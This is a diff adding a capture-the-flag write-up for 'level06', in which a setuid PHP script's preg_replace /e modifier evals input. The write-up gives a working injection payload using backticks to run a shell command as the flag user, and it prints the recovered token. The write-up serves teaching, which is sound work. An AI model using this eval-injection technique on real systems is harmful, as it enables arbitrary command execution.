@@ -1,0 +1,60 @@
+We have one `level06` executable file and one `level06.php` file:
+
+    -rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
+    -rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
+
+When we try to execute the executable file:
+    
+        ./level06
+        
+    PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
+
+Let's see what is in the php file:
+
+        cat level06.php
+
+    #!/usr/bin/php
+    <?php
+    function y($m) { 
+        $m = preg_replace("/\./", " x ", $m); 
+        $m = preg_replace("/@/", " y", $m); 
+        return $m; 
+    }
+    function x($y, $z) { 
+        $a = file_get_contents($y); 
+        $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
+        $a = preg_replace("/\[/", "(", $a); 
+        $a = preg_replace("/\]/", ")", $a); 
+        return $a; }
+    $r = x($argv[1], $argv[2]); 
+    print $r;
+    ?>
+
+This first function called by this scipt is `function x` :
+
+`file_get_contents` - reads entire file into a string.
+
+"The /e modifier takes a replacement string, and substitutes backslash followed by a number (e.g. \1) 
+with the appropriate back-reference - but because you're inside a string, you need to escape the backslash, 
+so you get '\\1'. It then (effectively) runs eval to run the resulting string as though it was PHP code 
+(which is why it's being deprecated, because it's easy to use eval in an insecure way)."
+ 
+`preg_replace` - usage together with the `/e` modifier was quite common among PHP-based scripts, apps and interfaces until few years ago.
+
+`preg_replace($pattern, $replacement, $subject)`
+
+It is possible to execute shell in PHP with backticks.
+We can exploit this function by passing our own code, which will be evaluated as PHP code and executed as user `flag04`. 
+For this, the argument should pass the regex `/(\[x (.*)\])/e` and looks like `[x <our code>]`.
+Our code must respect the PHP syntax.
+By using variable, an error can be generated which should show the flag.
+
+Let's try it:
+    
+        echo '[x ${`getflag`}]' > /tmp/getflag
+    
+    /tmp/getflag
+    PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+    in /home/user/level06/level06.php(4) : regexp code on line 1
+
+LEVEL06 PASSWORD: wiok45aaoguiboiki2tuin6ub
